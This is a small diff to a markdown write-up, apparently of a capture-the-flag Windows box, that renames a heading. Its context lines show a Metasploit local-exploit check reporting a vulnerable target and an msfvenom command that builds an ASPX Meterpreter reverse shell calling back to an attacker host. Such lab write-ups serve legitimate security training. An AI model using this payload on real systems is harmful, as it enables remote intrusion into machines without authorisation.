@@ -434,7 +434,7 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
 ```
 
-## Another Reverse Shell, with Meterpreter & MSFVenom
+## Alternative Reverse Shell, with Meterpreter & MSFVenom
 Let's generate a custom `.aspx` reverse shell. [Source](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
 ```
 msf5 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
